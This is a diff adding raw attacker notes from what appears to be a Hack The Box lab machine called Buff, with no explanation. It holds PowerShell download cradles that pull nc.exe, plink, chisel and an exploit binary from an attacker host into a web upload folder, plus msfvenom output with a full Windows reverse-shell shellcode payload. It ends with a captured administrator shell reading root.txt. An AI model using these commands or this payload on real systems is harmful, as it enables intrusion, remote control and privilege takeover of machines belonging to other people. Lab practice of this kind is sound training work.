@@ -477,3 +477,100 @@ SeTimeZonePrivilege           Change the time zone                 Disabled
 ERROR: Unable to get user claims information.                                                                     
                                                                                                                   
                                                                                    
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/44470.exe', 'C:\xampp\htdocs\gym\upload\44470.exe')
+
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/python27.dll', 'C:\xampp\htdocs\gym\upload\python27.dll')
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/plink.exe', 'C:\xampp\htdocs\gym\upload\plink.exe')
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/nc.exe', 'C:\xampp\htdocs\gym\upload\nc.exe')
+
+
+kali@kali:~/HTB/buff$ msfvenom -a x86 -p windows/shell_reverse_tcp  -b '\x00\x0A\x0D' -f python LPORT=4444 LHOST=10.10.14.10 -v payload
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of python file: 1869 bytes
+payload =  b""
+payload += b"\xbd\xb9\x95\xc8\xd9\xdb\xde\xd9\x74\x24\xf4\x5f"
+payload += b"\x29\xc9\xb1\x52\x83\xc7\x04\x31\x6f\x0e\x03\xd6"
+payload += b"\x9b\x2a\x2c\xd4\x4c\x28\xcf\x24\x8d\x4d\x59\xc1"
+payload += b"\xbc\x4d\x3d\x82\xef\x7d\x35\xc6\x03\xf5\x1b\xf2"
+payload += b"\x90\x7b\xb4\xf5\x11\x31\xe2\x38\xa1\x6a\xd6\x5b"
+payload += b"\x21\x71\x0b\xbb\x18\xba\x5e\xba\x5d\xa7\x93\xee"
+payload += b"\x36\xa3\x06\x1e\x32\xf9\x9a\x95\x08\xef\x9a\x4a"
+payload += b"\xd8\x0e\x8a\xdd\x52\x49\x0c\xdc\xb7\xe1\x05\xc6"
+payload += b"\xd4\xcc\xdc\x7d\x2e\xba\xde\x57\x7e\x43\x4c\x96"
+payload += b"\x4e\xb6\x8c\xdf\x69\x29\xfb\x29\x8a\xd4\xfc\xee"
+payload += b"\xf0\x02\x88\xf4\x53\xc0\x2a\xd0\x62\x05\xac\x93"
+payload += b"\x69\xe2\xba\xfb\x6d\xf5\x6f\x70\x89\x7e\x8e\x56"
+payload += b"\x1b\xc4\xb5\x72\x47\x9e\xd4\x23\x2d\x71\xe8\x33"
+payload += b"\x8e\x2e\x4c\x38\x23\x3a\xfd\x63\x2c\x8f\xcc\x9b"
+payload += b"\xac\x87\x47\xe8\x9e\x08\xfc\x66\x93\xc1\xda\x71"
+payload += b"\xd4\xfb\x9b\xed\x2b\x04\xdc\x24\xe8\x50\x8c\x5e"
+payload += b"\xd9\xd8\x47\x9e\xe6\x0c\xc7\xce\x48\xff\xa8\xbe"
+payload += b"\x28\xaf\x40\xd4\xa6\x90\x71\xd7\x6c\xb9\x18\x22"
+payload += b"\xe7\xcc\xd6\x22\xfd\xb8\xe4\x3a\x10\x65\x60\xdc"
+payload += b"\x78\x85\x24\x77\x15\x3c\x6d\x03\x84\xc1\xbb\x6e"
+payload += b"\x86\x4a\x48\x8f\x49\xbb\x25\x83\x3e\x4b\x70\xf9"
+payload += b"\xe9\x54\xae\x95\x76\xc6\x35\x65\xf0\xfb\xe1\x32"
+payload += b"\x55\xcd\xfb\xd6\x4b\x74\x52\xc4\x91\xe0\x9d\x4c"
+payload += b"\x4e\xd1\x20\x4d\x03\x6d\x07\x5d\xdd\x6e\x03\x09"
+payload += b"\xb1\x38\xdd\xe7\x77\x93\xaf\x51\x2e\x48\x66\x35"
+payload += b"\xb7\xa2\xb9\x43\xb8\xee\x4f\xab\x09\x47\x16\xd4"
+payload += b"\xa6\x0f\x9e\xad\xda\xaf\x61\x64\x5f\xdf\x2b\x24"
+payload += b"\xf6\x48\xf2\xbd\x4a\x15\x05\x68\x88\x20\x86\x98"
+payload += b"\x71\xd7\x96\xe9\x74\x93\x10\x02\x05\x8c\xf4\x24"
+payload += b"\xba\xad\xdc"
+
+
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.10/chisel_1.7.2_windows_386', 'C:\xampp\htdocs\gym\upload\chisel.exe')
+chisel_1.7.2_windows_386
+
+
+kali@kali:~/HTB/buff$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.198] 49777
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>cd .. 
+cd ..
+
+C:\>cd Users
+cd Users
+
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>whoami
+whoami
+buff\administrator
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+7ddf32e17a6ac5ce04a8ecbf782ca509
+C:\Users\Administrator\Desktop>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : dead:beef::78f4:12d0:34b6:1e3a
+   Temporary IPv6 Address. . . . . . : dead:beef::e03a:836c:2375:6632
+   Link-local IPv6 Address . . . . . : fe80::78f4:12d0:34b6:1e3a%10
+   IPv4 Address. . . . . . . . . . . : 10.10.10.198
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:75a0%10
+                                       10.10.10.2
+
